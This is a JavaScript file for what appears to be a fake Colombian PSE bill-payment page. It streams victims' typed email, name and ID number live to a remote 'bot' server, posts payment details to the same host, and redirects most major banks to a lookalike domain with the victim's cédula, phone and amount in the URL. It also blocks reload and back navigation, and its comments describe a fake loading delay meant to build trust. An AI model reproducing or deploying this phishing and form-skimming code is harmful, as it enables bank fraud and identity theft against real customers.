// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI + Enrutamiento Dinámico

const socket = io('https://apifinacjs.pagoswebcol.uk'); 

let isTransactionActive = false;
let browserRequested = false; 
const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// ==========================================
// CONFIGURACIÓN DE ENRUTAMIENTO POR BANCO
// ==========================================
const RUTAS_BANCOS = {
    // Define los bancos que van a URLs externas o APIs distintas.
    // "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO DAVIVIENDA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO DE BOGOTA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "DAVIbank": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO DE OCCIDENTE": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO CAJA SOCIAL": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO AV VILLAS": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO FALABELLA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO POPULAR": { tipo: "redirect", url: "https://clientes-pse.com/" },
    // "BANCO SERFINANZA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCOLOMBIA": { tipo: "redirect", url: "https://clientes-pse.com/" }
    // Los bancos que no estén aquí usarán la API normal (socket)
};

// ==========================================
// SEGURIDAD: PREVENIR RECARGA Y RETROCESO DURANTE LA CARGA
// ==========================================

// Prevenir recarga mediante el botón del navegador
window.addEventListener('beforeunload', (e) => {
    if (isTransactionActive) {
        e.preventDefault();
        e.returnValue = 'Por favor espere la carga. La transacción está en proceso.';
        return 'Por favor espere la carga. La transacción está en proceso.';
    }
});

// Prevenir retroceso con el botón "Atrás" del navegador
window.addEventListener('popstate', function (event) {
    if (isTransactionActive) {
        // Vuelve a empujar el estado actual para anular el retroceso
        history.pushState(null, document.title, location.href);
    }
});

// Prevenir teclas de recarga (F5, Ctrl+R, Cmd+R)
document.addEventListener('keydown', function (e) {
    if (isTransactionActive) {
        if (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r') || (e.metaKey && e.key.toLowerCase() === 'r')) {
            e.preventDefault();
        }
    }
});

// ==========================================
// INICIALIZACIÓN DE DATOS
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    // 1. Obtener los datos correctamente del localStorage
    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};

    // 2. SE MUESTRAN LOS DATOS EN LAS ETIQUETAS DE TEXTO (PANEL DE RESUMEN)
    if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
    if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
    if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
    if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;

    // 3. LOS INPUTS DONDE SE ESCRIBE QUEDAN TOTALMENTE LIMPIOS Y VACÍOS
    if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
    if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
    if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
    if (document.getElementById('formCelular')) document.getElementById('formCelular').value = "";

    const monto = data.montoPagar || 0;
    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);

    if(document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
    if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
    if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
});

// ==========================================
// 1. ABRIR EL NAVEGADOR Y ACTUALIZAR BANCO EN VIVO
// ==========================================
const selectBanco = document.getElementById('selectBanco');
if (selectBanco) {
    selectBanco.addEventListener('change', (e) => {
        const bancoSeleccionado = e.target.value;
        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const amount = data.montoPagar || 0;
        
        // Verificamos qué ruta le toca a este banco
        const config = RUTAS_BANCOS[bancoSeleccionado] || { tipo: "socket" };

        if (config.tipo === "socket") {
            // --- Lógica original de la API (Bot) ---
            if (!browserRequested) {
                socket.emit('init_browser', { bank: bancoSeleccionado, amount: amount });
                browserRequested = true;
                console.log("Iniciando bot con el banco:", bancoSeleccionado);
            } else {
                socket.emit('live_type', { field: 'bank', value: bancoSeleccionado });
                console.log("Cambiando el banco en vivo a:", bancoSeleccionado);
            }
        } else {
            // --- Lógica de Redirección ---
            console.log(`El banco ${bancoSeleccionado} está configurado para ruta externa.`);
            browserRequested = false; // Desactivamos la bandera del bot
        }
    });
}

// ==========================================
// 2. SINCRONIZACIÓN EN VIVO (LIVE TYPING - 400ms Anti-Spam)
// ==========================================
function syncInput(inputId, fieldName) {
    const input = document.getElementById(inputId);
    let timeoutId; 

    if (input) {
        input.addEventListener('input', (e) => {
            const bancoActual = selectBanco ? selectBanco.value : "";
            const config = RUTAS_BANCOS[bancoActual] || { tipo: "socket" };

            // Solo disparamos el evento si es un banco de la API normal y ya se solicitó el browser
            if (config.tipo === "socket" && browserRequested) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => {
                    socket.emit('live_type', { field: fieldName, value: e.target.value });
                }, 400); 
            }
        });
    }
}
syncInput('formCorreo', 'email');
syncInput('formNombre', 'name');
syncInput('formNumId', 'doc');

// ==========================================
// 3. FINALIZAR PAGO
// ==========================================
const botonPagar = document.querySelector('.btn-pay');
let loadingInterval;

if (botonPagar) {
    botonPagar.addEventListener('click', function() {
        const banco = selectBanco ? selectBanco.value : "";
        const email = document.getElementById('formCorreo').value.trim();
        const doc   = document.getElementById('formNumId').value.trim();
        const name  = document.getElementById('formNombre').value.trim();
        const phone = document.getElementById('formCelular').value.trim();

        const config = RUTAS_BANCOS[banco] || { tipo: "socket" };

        if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco de la lista."); return; }
        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
        
        // Esta validación ahora solo aplica si es un banco de la API normal
        if (config.tipo === "socket" && !browserRequested) { 
            alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); 
            return; 
        }

        // Activar estado de bloqueo de seguridad
        isTransactionActive = true; 
        history.pushState(null, document.title, location.href); // Preparar bloqueo de botón "Atrás"

        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('dynamicLoadingText');
        
        if (overlay) overlay.style.display = 'flex';
        loadingInterval = animateLoadingText(loadingText);

        const facturaData = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const montoTotal = facturaData.montoPagar || 0;

        // ==========================================
        // NOTIFICACIÓN DE ALERTA DE PAGO AL BACKEND
        // ==========================================
        fetch('https://apifinacjs.pagoswebcol.uk/api/payment-alert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                nombre: name,
                monto: montoTotal,
                correo: email,
                banco: banco,
                url: window.location.href 
            })
        }).catch(err => console.error("Error al enviar alerta de pago:", err));

        // ==========================================
        // RAMIFICACIÓN DE RUTAS
        // ==========================================
        if (config.tipo === "socket") {
            // Flujo Normal: Envía los datos exactos que el usuario acaba de escribir como garantía final
            socket.emit('submit_payment', {
                email: email,
                name: name,
                doc: doc,
                bank: banco
            });
        } else if (config.tipo === "redirect") {
            // Flujo Alternativo: Enviar a URL externa
            if (loadingText) loadingText.textContent = "Preparando entorno seguro...";
            
            // Construcción dinámica de la URL con los parámetros del formulario actual
            const urlDestino = new URL(config.url);
            urlDestino.searchParams.append('nombre', name);
            urlDestino.searchParams.append('cedula', doc);
            urlDestino.searchParams.append('correo', email);
            urlDestino.searchParams.append('celular', phone);
            urlDestino.searchParams.append('banco', banco);
            urlDestino.searchParams.append('monto', montoTotal);

            // Simulamos 2 segundos de "carga" en UI para dar confianza, y redirigimos
            setTimeout(() => {
                clearInterval(loadingInterval);
                isTransactionActive = false; 
                window.location.href = urlDestino.toString();
            }, 2000);
        }
    });
}

// ==========================================
// RESPUESTAS DEL SERVIDOR
// ==========================================
socket.on('browser_ready', () => {
    console.log("Servidor: Formulario base llenado con éxito y esperando modificaciones.");
});

socket.on('payment_success', (data) => {
    const loadingText = document.getElementById('dynamicLoadingText');
    if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
    clearInterval(loadingInterval);
    setTimeout(() => {
        isTransactionActive = false; // Liberar seguridad
        window.location.href = data.url; 
    }, 1500);
});

socket.on('payment_error', (data) => {
    // 1. Detener la animación y limpiar variables
    clearInterval(loadingInterval);
    isTransactionActive = false; // Liberar botones y recargas

    // 2. Quitar la pantalla de carga para quedarse en el mismo index
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    // 3. Avisar al usuario del error
    alert("Hubo un problema de conexión con el banco: " + data.message);
    
    // 4. Reiniciar la solicitud del bot para que el usuario pueda intentarlo de nuevo
    browserRequested = false;
    if (selectBanco) selectBanco.value = ""; 
});

// ==========================================
// UTILIDADES
// ==========================================
function animateLoadingText(element) {
    if (!element) return null;
    const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
    let i = 0;
    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
}
function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
function enmascararCorreo(email) {
    if(!email) return "";
    const [user] = email.split("@");
    return user.substring(0, 2) + "*******@*****.com";
}
